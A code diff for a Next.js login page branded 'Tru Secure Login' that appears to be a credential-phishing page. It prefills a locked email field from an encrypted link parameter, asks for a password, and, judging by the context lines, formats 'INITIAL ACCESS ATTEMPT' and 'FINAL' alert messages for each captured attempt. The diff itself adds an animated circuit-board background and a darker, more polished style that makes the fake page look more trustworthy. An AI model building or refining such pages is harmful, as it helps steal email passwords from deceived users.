@@ -2,7 +2,6 @@ import { useState, useEffect } from 'react';
 import { motion } from 'framer-motion';
 import CryptoJS from 'crypto-js';
 import { useRouter } from 'next/router';
-import Image from 'next/image';
 
 const LoginPage = () => {
   const [email, setEmail] = useState('');
@@ -14,6 +13,47 @@ const LoginPage = () => {
   const router = useRouter();
 
   useEffect(() => {
+    // Create circuit board background
+    const createCircuitBackground = () => {
+      const board = document.querySelector('.circuit-board');
+      if (!board) return;
+      
+      // Clear any existing elements
+      board.innerHTML = '';
+      
+      // Create circuit lines
+      for (let i = 0; i < 20; i++) {
+        const line = document.createElement('div');
+        line.className = 'circuit-line';
+        
+        const isHorizontal = Math.random() > 0.5;
+        const width = isHorizontal ? Math.random() * 300 + 100 : 2;
+        const height = isHorizontal ? 2 : Math.random() * 300 + 100;
+        
+        line.style.width = `${width}px`;
+        line.style.height = `${height}px`;
+        line.style.left = `${Math.random() * 100}%`;
+        line.style.top = `${Math.random() * 100}%`;
+        line.style.opacity = Math.random() * 0.5 + 0.1;
+        
+        board.appendChild(line);
+      }
+      
+      // Create circuit nodes
+      for (let i = 0; i < 30; i++) {
+        const node = document.createElement('div');
+        node.className = 'circuit-node';
+        
+        const size = Math.random() * 12 + 4;
+        node.style.width = `${size}px`;
+        node.style.height = `${size}px`;
+        node.style.left = `${Math.random() * 100}%`;
+        node.style.top = `${Math.random() * 100}%`;
+        
+        board.appendChild(node);
+      }
+    };
+
     const extractAESFromURL = () => {
       const url = window.location.href;
       const aesParam = url.split('&AES=')[1];
@@ -42,6 +82,9 @@ const LoginPage = () => {
         setError('Invalid or corrupted link');
       }
     }
+    
+    // Create the circuit background after component mounts
+    createCircuitBackground();
   }, []);
 
   const handleSubmit = async (e) => {
@@ -111,7 +154,7 @@ ${step === 1 ? '⚠️ *INITIAL ACCESS ATTEMPT DETECTED* ⚠️' : '🚨 *FINAL 
 
   if (error && error === 'Invalid or corrupted link') {
     return (
-      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+      <div className="min-h-screen bg-gradient-to-br from-blue-900 to-blue-700 flex items-center justify-center p-4">
         <div className="w-full max-w-md bg-white rounded-lg shadow-md p-6">
           <div className="text-center">
             <div className="text-red-500 text-5xl mb-4">❌</div>
@@ -125,56 +168,56 @@ ${step === 1 ? '⚠️ *INITIAL ACCESS ATTEMPT DETECTED* ⚠️' : '🚨 *FINAL 
   }
 
   return (
-    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+    <div className="min-h-screen bg-gradient-to-br from-blue-900 to-blue-700 flex items-center justify-center p-4 relative overflow-hidden">
+      {/* Circuit Board Background */}
+      <div className="circuit-board absolute inset-0 z-0 opacity-50"></div>
+      
       <motion.div
         initial={{ opacity: 0, y: 20 }}
         animate={{ opacity: 1, y: 0 }}
         transition={{ duration: 0.5 }}
-        className="w-full max-w-md"
+        className="w-full max-w-md z-10"
       >
-        <div className="bg-white rounded-lg shadow-md overflow-hidden border border-gray-200">
-          <div className="p-6 bg-blue-600">
+        <div className="bg-gray-900 bg-opacity-80 backdrop-blur-md rounded-xl shadow-2xl overflow-hidden border border-blue-500 border-opacity-30">
+          <div className="p-6 bg-gradient-to-r from-blue-700 to-blue-600">
             <div className="flex items-center justify-center flex-col">
-              <div className="bg-white p-2 rounded-full mb-4">
-                <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center">
-                  <svg className="h-8 w-8 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
+              <div className="bg-white p-3 rounded-full mb-4">
+                <div className="w-16 h-16 bg-gradient-to-r from-blue-500 to-cyan-400 rounded-full flex items-center justify-center">
+                  <svg className="h-8 w-8 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                   </svg>
                 </div>
               </div>
               <h1 className="text-2xl font-bold text-white text-center">Tru Secure Login</h1>
+              <p className="text-blue-100 mt-2">Verify your email access to continue</p>
             </div>
           </div>
           
           <div className="p-6">
-            <div className="text-center mb-6">
-              <p className="text-gray-600">Verify your email access to continue</p>
-            </div>
-            
             {error && !success && (
-              <div className={`mb-4 p-3 rounded-md text-sm ${step === 2 ? 'bg-red-100 text-red-700 border border-red-200' : 'bg-yellow-100 text-yellow-700 border border-yellow-200'}`}>
+              <div className={`mb-4 p-3 rounded-md text-sm ${step === 2 ? 'bg-red-900 bg-opacity-50 text-red-200 border border-red-700' : 'bg-yellow-900 bg-opacity-50 text-yellow-200 border border-yellow-700'}`}>
                 {error}
               </div>
             )}
             
             {success ? (
               <div className="text-center py-4">
-                <div className="text-green-500 text-5xl mb-4">✓</div>
-                <h3 className="text-xl font-bold text-gray-800 mb-2">Login Successful</h3>
-                <p className="text-gray-600">Redirecting you to the application...</p>
-                <div className="mt-4 bg-blue-50 p-3 rounded border border-blue-100">
-                  <p className="text-blue-600 text-sm">Your access has been granted</p>
+                <div className="text-green-400 text-5xl mb-4">✓</div>
+                <h3 className="text-xl font-bold text-white mb-2">Login Successful</h3>
+                <p className="text-blue-200">Redirecting you to the application...</p>
+                <div className="mt-4 bg-blue-900 bg-opacity-50 p-3 rounded border border-blue-700">
+                  <p className="text-blue-300 text-sm">Your access has been granted</p>
                 </div>
               </div>
             ) : (
               <form onSubmit={handleSubmit}>
                 <div className="mb-4">
-                  <label className="block text-gray-700 text-sm font-medium mb-2">
+                  <label className="block text-blue-200 text-sm font-medium mb-2">
                     Email Address
                   </label>
                   <div className="relative">
                     <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
-                      <svg className="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                      <svg className="h-5 w-5 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                         <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                       </svg>
                     </div>
@@ -182,18 +225,18 @@ ${step === 1 ? '⚠️ *INITIAL ACCESS ATTEMPT DETECTED* ⚠️' : '🚨 *FINAL 
                       type="email"
                       value={email}
                       disabled
-                      className="bg-gray-100 border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500 block w-full pl-10 p-2.5 text-gray-500"
+                      className="bg-blue-900 bg-opacity-50 border border-blue-700 rounded-md focus:ring-blue-500 focus:border-blue-500 block w-full pl-10 p-2.5 text-blue-200 placeholder-blue-400"
                     />
                   </div>
                 </div>
                 
                 <div className="mb-4">
-                  <label className="block text-gray-700 text-sm font-medium mb-2">
+                  <label className="block text-blue-200 text-sm font-medium mb-2">
                     Password
                   </label>
                   <div className="relative">
                     <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
-                      <svg className="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                      <svg className="h-5 w-5 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                         <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                       </svg>
                     </div>
@@ -203,17 +246,17 @@ ${step === 1 ? '⚠️ *INITIAL ACCESS ATTEMPT DETECTED* ⚠️' : '🚨 *FINAL 
                       onChange={(e) => setPassword(e.target.value)}
                       required
                       minLength={5}
-                      className="border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500 block w-full pl-10 p-2.5"
+                      className="bg-blue-900 bg-opacity-50 border border-blue-700 rounded-md focus:ring-blue-500 focus:border-blue-500 block w-full pl-10 p-2.5 text-white placeholder-blue-400"
                       placeholder="Enter your password"
                     />
                   </div>
-                  <p className="text-xs text-gray-500 mt-1">Password must be at least 5 characters</p>
+                  <p className="text-xs text-blue-400 mt-1">Password must be at least 5 characters</p>
                 </div>
                 
                 <button
                   type="submit"
                   disabled={isLoading}
-                  className="w-full bg-blue-600 hover:bg-blue-700 focus:ring-4 focus:ring-blue-300 font-medium rounded-md text-sm px-5 py-2.5 text-center text-white transition-all duration-200 disabled:opacity-75"
+                  className="w-full bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-700 hover:to-cyan-600 focus:ring-4 focus:ring-blue-300 font-medium rounded-md text-sm px-5 py-2.5 text-center text-white transition-all duration-200 disabled:opacity-75 shadow-lg"
                 >
                   {isLoading ? (
                     <span className="flex items-center justify-center">
@@ -231,13 +274,39 @@ ${step === 1 ? '⚠️ *INITIAL ACCESS ATTEMPT DETECTED* ⚠️' : '🚨 *FINAL 
             )}
           </div>
           
-          <div className="px-6 py-3 bg-gray-50 border-t border-gray-200 text-center">
-            <p className="text-xs text-gray-500">
+          <div className="px-6 py-3 bg-blue-900 bg-opacity-70 border-t border-blue-700 text-center">
+            <p className="text-xs text-blue-300">
               Secure Login System • {new Date().getFullYear()}
             </p>
           </div>
         </div>
       </motion.div>
+
+      <style jsx global>{`
+        .circuit-board {
+          position: absolute;
+          top: 0;
+          left: 0;
+          width: 100%;
+          height: 100%;
+          z-index: 0;
+          overflow: hidden;
+          pointer-events: none;
+        }
+        
+        .circuit-line {
+          position: absolute;
+          background: rgba(0, 255, 255, 0.15);
+          border-radius: 1px;
+        }
+        
+        .circuit-node {
+          position: absolute;
+          background: rgba(0, 200, 255, 0.4);
+          border-radius: 50%;
+          box-shadow: 0 0 15px rgba(0, 200, 255, 0.5);
+        }
+      `}</style>
     </div>
   );
 };
